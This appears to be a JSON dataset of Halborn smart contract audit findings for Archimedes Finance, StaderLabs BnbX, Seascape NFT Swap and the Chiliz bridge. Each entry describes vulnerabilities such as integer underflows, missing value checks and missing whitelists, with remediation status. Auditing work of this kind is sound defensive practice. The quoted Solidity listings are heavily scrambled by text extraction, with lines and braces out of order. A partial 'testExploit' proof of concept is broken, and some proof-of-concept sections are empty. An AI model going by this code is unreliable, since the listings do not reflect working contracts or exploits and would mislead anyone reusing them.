it has been partially solved. 28 ",
        "labels": [
            "Halborn",
            "Archimedes_Finance",
            "Severity: Informational"
        ]
    },
    {
        "title": "REDUNDANT FUNCTIONS CALLS AND CHECKS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Archimedes_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "While requirements are needed for proper usage and security of the con- tracts, some redundant validations have been seen. Code Location: In this instance, the getAllowedLeverageForPositionWithArch function will already call and return the getAllowedLeverageForPosition function return value. Moreover, this function will already revert if not enough ARCH is provided. Making the require statements in lines 90 and 94 redundant. Listing 9: contracts/LeverageEngine.sol (Lines 87,88,90,94) // add some minor buffer to the arch we will use for the ) external nonReentrant whenNotPaused returns ( uint256 ) { revert (\" Invalid number of cycles \" ); if ( cycles == 0 || cycles > _parameterStore . uint256 ousdPrinciple , uint256 cycles , uint256 maxArchAmount 72 function createLeveragedPosition ( 73 74 75 76 77  position 78  getMaxNumberOfCycles () ) { 79 80 81 82  getMinPositionCollateral () ) { 83 84 85  maxArchAmount ) ; 86 87  getAllowedLeverageForPositionWithArch ( ousdPrinciple , cycles ,  maxArchAmountBufferedDown ); } // console . log (\" ousdPrinciple % s \", ousdPrinciple ) ; if ( ousdPrinciple < _parameterStore . uint256 maxArchAmountBufferedDown = maxArchAmount ; uint256 lvUSDAmount = _parameterStore . } // console . log (\" maxArchAmountBufferedDown % s\", revert (\" Collateral lower then min \" ); 29 require ( lvUSDAmountNeedForArguments - 1 <= lvUSDAmount , \" // / check that user gave enough arch allowance for cycle - // console . log (\" archNeededToBurn % s \", maxArchAmount ) ; uint256 lvUSDAmountNeedForArguments = _parameterStore . 88  getAllowedLeverageForPosition ( ousdPrinciple , cycles ); 89  principle combo 90  cant get enough lvUSD \" ); 91 uint256 archNeededToBurn = ( _parameterStore .  calculateArchNeededForLeverage ( lvUSDAmount ) / 10000) * 10000; //  minus 1000 wei 92 93 94  Not enough Arch given for Pos \"); 95  ; 96  lvUSD \"); 97 98  sender ); 99  ousdPrinciple ); _burnArchTokenForPosition ( msg . sender , archNeededToBurn ); uint256 positionTokenId = _positionToken . safeMint ( msg . require ( archNeededToBurn <= maxArchAmountBufferedDown , \" _ousd . safeTransferFrom ( msg . sender , _addressCoordinator , require ( availableLev >= lvUSDAmount , \" Not enough available uint256 availableLev = _coordinator . getAvailableLeverage () 100 _coordinator . depositCollateralUnderNFT ( positionTokenId ,  ousdPrinciple ); 101  ); 102 _coordinator . getLeveragedOUSD ( positionTokenId , lvUSDAmount uint256 psoitionExpireTime = _coordinator .  getPositionExpireTime ( positionTokenId ); 103 104 emit PositionCreated ( msg . sender , positionTokenId ,  ousdPrinciple , lvUSDAmount , archNeededToBurn , psoitionExpireTime ); 105 106 107 } return positionTokenId ; Risk Level: Likelihood - 1 Impact - 1 30 Recommendation: Avoid calling the same function twice unnecessarily. Remediation Plan: PARTIALLY SOLVED: The Archimedes Finance team fixed the issue in some instances, but it has been partially solved. 31 ",
        "labels": [
            "Halborn",
            "Archimedes_Finance",
            "Severity: Informational"
        ]
    },
    {
        "title": "USE OF POSTFIX OPERATORS RATHER THAN PREFIX OPERATORS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Archimedes_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The use of postfix operators i++ consume more gas than prefix operators ++i. Code Location: ParameterStore.sol - Line 176: for (uint256 i = 0; i < numberOfCycles; ++i){ PositionToken.sol - Line 88: for (uint256 i = 0; i < _addressToTokensOwnedMapping[from]. length; i++){ Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use prefix operators rather than postfix. Remediation Plan: SOLVED: The Archimedes Finance team fixed the issue. 32 3.10 (HAL-10) FOR LOOP COULD BE REPLACE BY MULTIPLICATION - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "Archimedes_Finance",
            "Severity: Informational"
        ]
    },
    {
        "title": "INTEGER UNDERFLOW",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/StaderLabs_BnbX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Calling the increaseTotalRedelegated function is causing an integer un- derflow in the startUndelegation function. If the totalRedelegated amount is increased by calling increaseTotalRedelegated , the startUndelegation transaction will revert with: operation underflowed or overflowed outside an unchecked block (in Solidity > 0.8). Because the undelegation process will fail, the user will not be able to withdraw the deposited BNB. Arithmetic error Code Location: The startUndelegation function performs a subtraction: Listing 1: StakeManager.sol (Line 282) external override whenNotPaused onlyRole ( BOT ) returns ( uint256 _uuid , uint256 _amount ) 265 function startUndelegation () 266 267 268 269 270 271 { 272 273 274 275 276 277 278 279 280 281 282 block . timestamp , 0, _amount ); totalDeposited -= _amount ; require ( totalBnbToWithdraw > 0, \" No Request to withdraw \" ); _uuid = undelegateUUID ++; _amount = totalBnbToWithdraw ; uuidToBotUndelegateRequestMap [ _uuid ] = BotUndelegateRequest ( 12 283 uint256 bnbXToBurn = totalBnbXToBurn ; // To avoid Reentrancy  attack 284 285 286 287 288 } totalBnbXToBurn = 0; totalBnbToWithdraw = 0; IBnbX ( bnbX ). burn ( address ( this ) , bnbXToBurn ); Where totalDeposited is an amount of BNB deposited and _amount is the value of totalBnbToWithdraw that is calculated in the requestWithdraw function: Listing 2: StakeManager.sol (Lines 193,206) 191 function requestWithdraw ( uint256 _amount ) external override  whenNotPaused { 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 require ( _amount > 0, \" Invalid Amount \"); uint256 amountInBnb = convertBnbXToBnb ( _amount ); IERC20Upgradeable ( bnbX ). safeTransferFrom ( msg . sender , address ( this ) , _amount ); uint256 totalStakedBnb = getTotalStakedBnb () ; require ( amountInBnb <= ( totalStakedBnb - totalBnbToWithdraw ) , \" Not enough BNB to withdraw \" ); totalBnbToWithdraw += amountInBnb ; totalBnbXToBurn += _amount ; userWithdrawalRequests [ msg . sender ]. push ( WithdrawalRequest ( undelegateUUID , amountInBnb , block .  timestamp ) 210 211 212 213 } ); emit RequestWithdraw ( msg . sender , _amount , amountInBnb ); The value taken from convertBnbXToBnb is added to totalBnbToWithdraw. The convertBnbXToBnb function calculates its value based on the output 13 of getTotalPooledBnb: Listing 3: StakeManager.sol (Line 455) 455 uint256 totalPooledBnb = getTotalPooledBnb () ; Which is using totalRedelegated set by the increaseTotalRedelegated func- tion: Listing 4: StakeManager.sol (Line 348) 347 function getTotalPooledBnb () public view override returns ( uint256  ) { 348 349 } return ( totalDeposited + totalRedelegated ); Risk Level: Likelihood - 3 Impact - 5 Recommendation: Make sure that calculations performed by other functions are not affected by increasing the delegated/staked amount with increaseTotalRedelegated. Remediation Plan: The addRestakingRewards called SOLVED: increaseTotalRedelegated), the amount del- egated must be greater than 0 to increase. Also, the startUndelegation function recalculates the BnbX/BNB ratio, instead of using a previously calculated one. now contains a check: (previously function 14 ",
        "labels": [
            "Halborn",
            "StaderLabs_BnbX",
            "Severity: High"
        ]
    },
    {
        "title": "CALLING increaseTotalRedelegated BEFORE USER DEPOSITS MAY CAUSE USER GETTING 0 BNBX",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/StaderLabs_BnbX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "If the increaseTotalRedelegated function is called when totalDeposited is 0 and the increased amount is greater than the amount of assets deposited by the first user, the depositor will get 0 BnbX tokens. Scenario:  Deposited amount is 0 (none deposited yet)  increaseTotalRedelegated function is called with 10 BNB as parameter  User deposits 1 BNB Result: The user gets 0 BnbX in return for a deposit of 1 BNB. Code Location: Listing 5: StakeManager.sol (Line 435) public view override returns ( uint256 ) 426 function convertBnbToBnbX ( uint256 _amount ) 427 428 429 430 431 { 432 433 434 435 436 437 uint256 totalShares = IBnbX ( bnbX ). totalSupply () ; totalShares = totalShares == 0 ? 1 : totalShares ; uint256 totalPooledBnb = getTotalPooledBnb () ; totalPooledBnb = totalPooledBnb == 0 ? 1 : totalPooledBnb ; 15 438 uint256 amountInBnbX = ( _amount * totalShares ) /  totalPooledBnb ; 439 440 441 } return amountInBnbX ; The getTotalPooledBnb calculation: Listing 6: StakeManager.sol (Line 348) 347 function getTotalPooledBnb () public view override returns ( uint256  ) { 348 349 } return ( totalDeposited + totalRedelegated ); Risk Level: Likelihood - 3 Impact - 3 Recommendation: Consider changing the conversion calculation logic so that increasing the amount delegated/staked has less impact on first deposits. Remediation Plan: SOLVED: The addRestakingRewards (previously called as increaseTotalRedelegated ) function, now contains a check: the amount delegated must be greater than 0 to increase. This solves the problem of first depositor getting 0 BnbX tokens: Reference 16 ",
        "labels": [
            "Halborn",
            "StaderLabs_BnbX",
            "Severity: Medium"
        ]
    },
    {
        "title": "CONTRACTS ARE NOT USING disableInitializers FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/StaderLabs_BnbX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The StakeManager and BnbX contracts use Open Zeppelin Initializable mod- ule. According to the Open Zeppelin guidelines the _disableInitializers function call should be added to the constructor to lock contracts after deployment. Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider calling the _disableInitializers function in the contracts constructor: Listing 7 1 // / @custom : oz - upgrades - unsafe - allow constructor 2 constructor () { 3 4 } _disableInitializers () ; Remediation Plan: SOLVED: The constructor with call to _disableInitializers() was added to StakeManager and BnbX contracts. 17 ",
        "labels": [
            "Halborn",
            "StaderLabs_BnbX",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING ADDRESS CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/StaderLabs_BnbX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The lack of zero address validation has been found in many instances when assigning user-supplied address values to state variables directly. Code Location: BnbX.sol, #37-49 The setStakeManager function allows you to set a stakeManager address to 0x0. StakeManager.sol, #70-73 The StakeManagers contract initialization function does not check that the passed addresses are non-0. StakeManager.sol, #326-338 The setBotAddress function allows a bots address to be set to 0x0. Risk Level: Likelihood - 1 Impact - 1 Recommendation: Add proper address validation when each state variable assignment is made from user-provided input. Remediation Plan: SOLVED: Added zero address checks in commit 4e04e46729153b6cb50d2ce4da2f807611fcc4d8 18 ",
        "labels": [
            "Halborn",
            "StaderLabs_BnbX",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING REENTRANCY GUARD",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_NFT_Swap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "During the audit, it was discovered that the cancelOffer function did not To protect against implement protections against reentrancy attacks. By using reentrancy attacks, it may be necessary to use a mutex. this lock, an attacker can no longer exploit the withdrawal function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that protects the function against re-entrancy attacks. Halborn attempted to exploit a possible reentrancy vulnerability in the cancelOffer function. However, it was not possible to successfully exploit the issue due to the NFT transfer not being successful after deletion of the offer index on the second iteration of the re-entered function. Code Location: The affected function was cancelOffer on line 396. Recommendation: It is recommended to add the nonReentrant modifier to avoid introducing future reentrancy vulnerabilities. Remediation Plan: SOLVED: The Seascape team added the nonReentrant modifier. 12 ",
        "labels": [
            "Halborn",
            "Seascape_NFT_Swap",
            "Severity: Low"
        ]
    },
    {
        "title": "NFT NUMBER 0 CAN NEVER BE TRADED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_NFT_Swap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "While currently supported NFTs start with tokenId equal to one, should additional NFT series be supported, with the first tokenId being zero, they would not be able to be traded. Code Location: Location: NftSwap.sol - function createOffer Listing 1 1 require ( _offeredTokens [ index ]. tokenId > 0, \" nft id must be greater  than 0\" ); Location: NftSwap.sol - function acceptOffer Listing 2 require ( _requestedTokenIds [ i ] > 0, \" nft id must be greater than 0 1  \" ); Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to remove this check to allow different NFT sets being swapped. 13 Remediation Plan: SOLVED: The Seascape team removed the require statements. 14 ",
        "labels": [
            "Halborn",
            "Seascape_NFT_Swap",
            "Severity: Informational"
        ]
    },
    {
        "title": "UPGRADE TO AT LEAST PRAGMA 0.8.10",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_NFT_Swap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Gas optimizations and additional safety checks are available for free when using newer compiler versions and the optimizer.  Safemath by default from 0.8.0 (can be more gas efficient than the SafeMath library)  Low level inliner: from 0.8.2, leads to cheaper runtime gas. This is especially relevant when the contract has small functions. For example, OpenZeppelin libraries typically have a lot of small helper functions and if they are not inlined, they cost an additional 20 to 40 gas because of 2 extra jump instructions and additional stack operations needed for function calls.  Optimizer improvements in packed structs: packed structs, in some cases used an After EIP-2929, if the slot additional storage read operation. was already cold, this means unnecessary stack operations and extra deploy time costs. However, if the slot was already warm, this means additional cost of 100 gas alongside the same unnecessary stack operations and extra deploy time costs. Before 0.8.3, storing  Custom errors from 0.8.4, leads to cheaper deploy time cost and run time cost. Note: the run time cost is only relevant when the revert condition is met. In short, replace revert strings by custom errors. Code Location: The contracts within scope made use of the pragma version 0.6.7 15 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Halborn recommends that the project is upgraded to use at least pragma 0.8.10. Remediation Plan: ACKNOWLEDGED: The Seascape team decided not to upgrade to the latest pragma versions and instead deploy with the current one. They confirmed that future projects will use the newest versions. 16 ",
        "labels": [
            "Halborn",
            "Seascape_NFT_Swap",
            "Severity: Informational"
        ]
    },
    {
        "title": "USING ++I CONSUMES LESS GAS THAN I++ IN LOOPS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_NFT_Swap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the loop below, the variable i is incremented using i++. It is known that, in loops, using ++i costs less gas per iteration than i++. This does not only apply to the iterator variable. It also applies to variables declared within the loop code block. Code Location: NFTSwap.sol  Line 236  Line 246  Line 260  Line 287  Line 290  Line 333  Line 355  Line 360  Line 402 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use ++i instead of i++ to increment the value of an uint variable inside a loop. This applies to the iterator variable and 17 to variables declared within the loop code block. Remediation Plan: SOLVED: The Seascape team now uses ++i to increment variables inside loops, saving some gas. 18 VERIFICATION OF MATHEMATICAL OPERATIONS SAFETY 19 Y T E F A S S  N O I T A R E P O L A C I T A M E H T A M F O N O I T A C I F I R E V Halborn reviewed the safety of the mathematical operations within the smart contract, as Seascape proposed removing the SafeMath library to reduce gas usage. This review allowed Halborn to identify one integer overflow vulnerability which will not be able to be exploited due to the conditions of the smart contract and the Crowns token total supply. Within the createOffer function, the following code dealt with calculating the amount of funds that would need to be transferred to the smart contract: Listing 3 if ( address ( crowns ) == _bountyAddress ) { require ( crowns . balanceOf ( msg . sender ) >= fee + _bounty , \" not enough CWS for fee & bounty \" ); require ( supportedBountyAddresses [ _bountyAddress ], \" bounty address not supported \" ); if ( _bountyAddress == address (0 x0 )) { require ( msg . value >= _bounty , \" insufficient transfer uint256 returnBack = msg . value . sub ( _bounty ); if ( returnBack > 0) msg . sender . transfer ( returnBack ); IERC20 currency = IERC20 ( _bountyAddress ); require ( currency . balanceOf ( msg . sender ) >= _bounty , \" not enough money to pay bounty \" ); } else { 1 if ( _bounty > 0) { 2 3 4 5 6 7 8 9 10  amount \"); 11 12 13 14 15 16 17 18 19 } else { } } Users can specify a bounty value, which is an additional sum of tokens that would be transferred in exchange for offered NFTs, against the requested NFTs. fee on the other hand, is a value decided by Seascape, which will initially be 1 - This represents the fee paid by the user creating an offer which is deposited in the smart contract, and burnt upon offer acceptance. 20 Y T E F A S S  N O I T A R E P O L A C I T A M E H T A M F O N O I T A C I F I R E V Should the bounty value be inserted as a large value which would allow overflowing the uint256 data type (2**256 - 1), attackers would be able to bypass the require statement detailed below as long as they hold the required amount of Crowns tokens to comply with the funds check. Listing 4 1 require ( crowns . balanceOf ( msg . sender ) >= fee + _bounty ) It should be noted that overflow is not possible when using different tokens. After performing the integer overflow attack, the large _bounty value would be stored as it is, whereas the actual transferred token amount would be the result of the overflowing calculation. Should an attacker cancel their offer, they would be returned the value resulted by the overflowed calculation; therefore, this could not result in any fund loss. On the other hand, should another user accept the offer, or the attacker accept its offer with a different wallet, the contract would be trying to send this large sum of Crowns token. Due to the large number needed to overflow this value, this would require the supply of the Crows token to multiply exponentially. Listing 5 if ( obj . bountyAddress == address (0) ) msg . sender . transfer ( obj . bounty ); 1 if ( obj . bounty > 0) { 2 3 4 5  bounty ); 6 } else IERC20 ( obj . bountyAddress ). safeTransfer ( msg . sender , obj . The current max supply of Crowns is 10e17, which is exponentially below the amount required to overflow the value, even if Seascape increases the fixed fee value by a considerably large amount. 21 Y T E F A S S  N O I T A R E P O L A C I T A M E H T A M F O N O I T A C I F I R E V The other calculation which could be vulnerable to overflow after removing SafeMath was the following: Listing 6 1 require ( msg . value >= _bounty , \" insufficient transfer amount \"); 2 uint256 returnBack = msg . value . sub ( _bounty ); Due to the require statement before the calculation, it would not be possible to provide a value that would cause an integer underflow. Seascape decided not to use SafeMath in their libraries and keep the So- lidity compiler version to 0.6.7 which does not offer built-in mathematics safety. 22 THANK YOU FOR CHOOSING",
        "labels": [
            "Halborn",
            "Seascape_NFT_Swap",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING COMPARISON BETWEEN MSG VALUE AND AMOUNT LEADS TO DRAINING OF THE FUNDS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Chiliz_Bridge_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "A smart contract that is missing a msg.value == amount check may be vulnerable to various types of attacks or errors. This check is typically used to verify that the amount of Ether (or other value token) being sent to the contract is equal to the expected amount. For example, if a user attempts to transfer 100 tokens but includes a msg.value of 200, the contract will not compare the two values and instead process the transfer as if the user were attempting to transfer 200 tokens. This will result in the user being able to withdraw 100 tokens without having the necessary balance, effectively draining 100 tokens from the contract. However, this contract is missing a msg.value == amount check. This means that if a user calls the transfer function and sends more or less Ether than the specified amount, the contract will not detect this and will still attempt to transfer the specified amount of Ether. This could potentially lead to a variety of problems, such as:  Overpayment: If a user sends more Ether than the specified amount, the excess Ether will be transferred to the recipient, but will not be accounted for by the contract. This means that the user may have overpaid for the transfer, and will not be able to recover the excess Ether.  Underpayment: If a user sends less Ether than the specified amount, the contract will still attempt to transfer the full amount of Ether. This means that the transfer will fail, and the user will not be able to recover the Ether they sent.  Invalid state: If a user sends a different amount of Ether than the specified amount, the contract will be in an invalid state, as the 17 amount of Ether transferred will not match the amount specified in the transfer function. This could potentially cause the contract to malfunction or become unresponsive. Overall, a smart contract that is missing a msg.value == amount check may be vulnerable to various types of errors or attacks. It is important to include this check in order to ensure that the contract operates correctly and securely. Code Location: Bridge.sol#L308 Listing 1 function deposit ( uint8 destinationChainID , bytes32 resourceID , address handler = _resourceIDToHandlerAddress [ resourceID ]; require ( handler != address (0) , \" resourceID not mapped to uint64 depositNonce = ++ _depositCounts [ destinationChainID _depositRecords [ depositNonce ][ destinationChainID ] = data ; IDepositExecute depositHandler = IDepositExecute ( handler ); if ( msg . value > 0) { require ( msg . value >= _fee , \" invalid value \"); 1  bytes calldata data ) external payable whenNotPaused { 2 3 4 5  handler \" ); 6 7  ]; 8 9 10 11 12 13 14 15 16 17  depositNonce , msg . sender , data ); 18 19  ; 20 21 uint256 valueToSend = msg . value - _fee ; if ( valueToSend > 0) { payable ( handler ). transfer ( valueToSend ); } } } depositHandler . deposit ( resourceID , destinationChainID , emit Deposit ( destinationChainID , resourceID , depositNonce ) 18 Proof of concept: Risk Level: Likelihood - 5 Impact - 5 Recommendation: Based on our analysis, the following actions are recommended:  Add a comparison between the msg.value and the amount in the deposit function.  Test the updated deposit function to ensure that it is functioning properly and preventing the draining of funds. Implementing these recommendations will improve the security and stability of the system by preventing the accidental or malicious drain of contract funds. 19 Remediation Plan: SOLVED: The Chiliz team solved the issue by adding a validation on the Handler and Bridge contracts. Commit ID: 0ad5bd40bfb1c321e2ff1030f75e202f9762cce6 20 ",
        "labels": [
            "Halborn",
            "Chiliz_Bridge_Updates",
            "Severity: Critical"
        ]
    },
    {
        "title": "INTEGER UNDERFLOW IN THE DEPOSIT FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Chiliz_Bridge_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the Solidity programming language, an integer underflow occurs when an integer variable is decremented below its minimum possible value. In Solidity, all integer variables have a fixed size and a fixed range of possible values. For example, a uint8 variable can hold a value between 0 and 255 (inclusive), and a int256 variable can hold a value between -2^255 and 2^255-1 (inclusive). The deposit function in the contract contains an integer underflow issue when calculating the amountMinusFee variable. This can happen when the value of the amount variable is less than the value of the bridgeFee variable. If an integer underflow occurs in the deposit function, the This can cause problems result will be a very large positive number. in the contract, as the large positive value of amountMinusFee will be treated as a valid amount. For example, it could be recorded in the depositRecords mapping and used to update the balance of the depositor. Code Location: NativeHandler.sol#L91 Listing 2 1 2 3 4 5 6 7 8 9 10 11 function deposit ( bytes32 resourceID , uint8 uint64 address depositer , bytes calldata data destinationChainID , depositNonce , ) external override onlyBridge { bytes uint256 uint256 memory recipientAddress ; amount ; lenRecipientAddress ; 21 amount := calldataload (0 xC4 ) recipientAddress := mload (0 x40 ) lenRecipientAddress := calldataload (0 xE4 ) mstore (0 x40 , add (0 x20 , add ( recipientAddress , recipientAddress , // copy to 0 xE4 , // copy from calldata @ 0 x104 sub ( calldatasize () , 0 xE ) // copy size ( ) } assembly { calldatacopy ( 12 13 14 15 16  lenRecipientAddress )) ) 17 18 19  destinationRecipientAddress 20 21  calldatasize - 0 x104 ) 22 23 24 25  resourceID ]; 26  tokenAddress is not whitelisted \" ); 27 28 29 30 31 32  DepositRecord ( 33 34 35 36 37 38 39 40 41 ); } tokenAddress , uint8 ( lenRecipientAddress ) , destinationChainID , resourceID , recipientAddress , depositer , amountMinusFee address tokenAddress = _resourceIDToTokenContractAddress [ require ( _contractWhitelist [ tokenAddress ], \" provided uint256 bridgeFee = IBridge ( _bridgeAddress ). _fee () ; uint256 amountMinusFee = amount - bridgeFee ; require ( amountMinusFee > 0, \" Invalid amount \"); _depositRecords [ destinationChainID ][ depositNonce ] = 22 Proof of concept: Risk Level: Likelihood - 5 Impact - 5 Recommendation: To address the issue of integer underflow leading to the draining of funds in the Solidity contract, we recommend the following actions:  Review the code of the contract to identify all instances where integer underflow can occur.  Implement appropriate safeguards to prevent integer underflow in each of these instances. This may involve using the SafeMath library, using the require statement to check for underflow, or using other techniques.  Test the updated contract to ensure that it is functioning properly, and that integer underflow is no longer possible.  Monitor the contract for any further issues related to integer underflow and address them as necessary. Implementing these recommendations will help to prevent the accidental or malicious draining of funds from the contract due to integer underflow, improving the security and stability of the system. 23 Remediation Plan: SOLVED: The Chiliz team solved the issue by upgrading to pragma 0.8.17 in contracts. Commit ID: add9f81660e4ab58778f4706e00fc4ac4234a153 24 ",
        "labels": [
            "Halborn",
            "Chiliz_Bridge_Updates",
            "Severity: Critical"
        ]
    },
    {
        "title": "LACK OF WHITELISTING ON THE CHAIN IDS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Chiliz_Bridge_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "If chain IDs are not whitelisted in a smart contract, it may be vulnerable to various types of attacks or errors. A whitelist is a list of approved or allowed values, and in the context of a smart contract, it is used to specify which chain IDs are allowed to interact with the contract. This could potentially lead to a variety of problems, such as:  Loss of tokens: If the contract attempts to transfer tokens to an unauthorized chain ID, the tokens may be lost or stolen, and the user will not be able to recover them.  Invalid state: If the contract attempts to transfer tokens to an unauthorized chain ID, the contracts internal state may become inconsistent or invalid. For example, if the contract maintains a record of all token transfers, it may record an invalid transfer to an unauthorized chain ID, which could cause the contract to malfunction or become unresponsive.  Denial of service: If an attacker can call the transfer function with an unauthorized chain ID, they may be able to prevent legitimate users from transferring tokens to certain chain IDs. This could potentially cause a denial of service, as users would not be able to transfer tokens to the affected chain IDs. Overall, a smart contract that does not have a whitelist of allowed chain IDs may be vulnerable to various types of attacks or errors. It is important to include a whitelist of allowed chain IDs in order to ensure that the contract operates correctly and securely. Code Location: NativeHandler.sol#L91 25 amount := calldataload (0 xC4 ) recipientAddress := mload (0 x40 ) lenRecipientAddress := calldataload (0 xE4 ) mstore (0 x40 , add (0 x20 , add ( recipientAddress , recipientAddress , // copy to 0 xE4 , // copy from calldata @ 0 x104 sub ( calldatasize () , 0 xE ) // copy size ( Listing 3 memory recipientAddress ; amount ; lenRecipientAddress ; ) external override onlyBridge { destinationChainID , depositNonce , assembly { calldata data calldatacopy ( function deposit ( bytes uint256 uint256 bytes32 resourceID , uint8 uint64 address depositer , bytes 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  lenRecipientAddress )) ) 17 18 19  destinationRecipientAddress 20 21  calldatasize - 0 x104 ) 22 23 24 25  resourceID ]; 26  tokenAddress is not whitelisted \" ); 27 28 29 30 31 32  DepositRecord ( 33 34 35 36 37 ) } tokenAddress , uint8 ( lenRecipientAddress ) , destinationChainID , resourceID , recipientAddress , address tokenAddress = _resourceIDToTokenContractAddress [ require ( _contractWhitelist [ tokenAddress ], \" provided uint256 bridgeFee = IBridge ( _bridgeAddress ). _fee () ; uint256 amountMinusFee = amount - bridgeFee ; require ( amountMinusFee > 0, \" Invalid amount \"); _depositRecords [ destinationChainID ][ depositNonce ] = 26 38 39 40 41 ); } depositer , amountMinusFee Proof of concept: Proof of concept code: Listing 4 1 contract Tester is DSTest { 2 address public user1 = address (0 xB0B ); 3 Bridge internal bridge ; 4 NativeHandler internal nativeHandler ; 5 6 CheatCodes cheats = CheatCodes (0  x7109709ECfa91a80626fF3989D68f67F5b1DD12D ); 7 8 9 10 11 12 13 address [] memory path = new address [](2) ; path [0] = address ( this ); path [1] = address ( this ); bridge = new Bridge (1 , path ,5 ,100 ,100) ; function setUp () public { bytes32 [] memory pathByteGG = new bytes32 [](2) ; 27 bytes32 tokenResource = keccak256 ( abi . encodePacked ( \" NATIVE pathByteGG [0] = keccak256 ( abi . encodePacked ( \" User1 \")) ; pathByteGG [1] = keccak256 ( abi . encodePacked ( \" User2 \")) ; bridge . adminSetResource ( address ( nativeHandler ) , nativeHandler = new NativeHandler ( address ( bridge ) , 14 15 16 17  pathByteGG , path , path ); 18 19  \" )); 20  tokenResource ,0 xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE ); 21 22 23 24 25 26 27 28  \" )); 29  tokenResource , test ); 30 31 } cheats . deal ( user1 ,1 _000_000 ether ); cheats . deal ( address ( this ) , 1 _000_000 ether ); bridge . deposit { value : 5 e2 }( anyChainId as uint8 Type , function testExploit () public { } } bytes memory test = \" \"; bytes32 tokenResource = keccak256 ( abi . encodePacked ( \" NATIVE Risk Level: Likelihood - 5 Impact - 5 Recommendation: One potential recommendation for addressing the issue of lack of whitelisting on the chain IDs is to implement a whitelisting mechanism in the contract. This could involve adding a mapping or array that stores the approved chain IDs, and checking this whitelist before allowing any transactions to be processed on the corresponding chain. For example, the contract could contain a chainIDWhitelist mapping, where each key is a chain ID and the corresponding value is a boolean indicating The deposit function could then be whether the chain ID is approved. 28 updated to check the chainIDWhitelist before processing any transactions. Remediation Plan: SOLVED: The Chiliz team solved the issue by adding a whitelist on chain ids. Commit ID: 72176b53657bc49d31bfd5f32ef73376505a5935 29 ",
        "labels": [
            "Halborn",
            "Chiliz_Bridge_Updates",
            "Severity: Critical"
        ]
    },
    {
        "title": "TOKENS CAN BE STUCKED IF THE SAME CHAIN",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Chiliz_Bridge_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the current implementation of the token bridge, the chain-id is used to identify the source and destination chains when transferring tokens. If the same chain-id is used on both sides of the bridge, the system is unable to determine which chain the tokens are coming from and which chain they are going to, and the tokens become stuck. Code Location: NativeHandler.sol#L91 Listing 5 destinationChainID , depositNonce , calldata data ) external override onlyBridge { memory recipientAddress ; amount ; lenRecipientAddress ; function deposit ( bytes uint256 uint256 bytes32 resourceID , uint8 uint64 address depositer , bytes 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  lenRecipientAddress )) ) 17 18 19  destinationRecipientAddress calldatacopy ( assembly { recipientAddress , // copy to amount := calldataload (0 xC4 ) recipientAddress := mload (0 x40 ) lenRecipientAddress := calldataload (0 xE4 ) mstore (0 x40 , add (0 x20 , add ( recipientAddress , 30 0 xE4 , // copy from calldata @ 0 x104 sub ( calldatasize () , 0 xE ) // copy size ( } address tokenAddress = _resourceIDToTokenContractAddress [ require ( _contractWhitelist [ tokenAddress ], \" provided uint256 bridgeFee = IBridge ( _bridgeAddress ). _fee () ; uint256 amountMinusFee = amount - bridgeFee ; require ( amountMinusFee > 0, \" Invalid amount \"); _depositRecords [ destinationChainID ][ depositNonce ] = ) 20 21  calldatasize - 0 x104 ) 22 23 24  resourceID ]; 25  tokenAddress is not whitelisted \" ); 26 27 28 29 30 31  DepositRecord ( 32 33 34 35 36 37 38 39 40 tokenAddress , uint8 ( 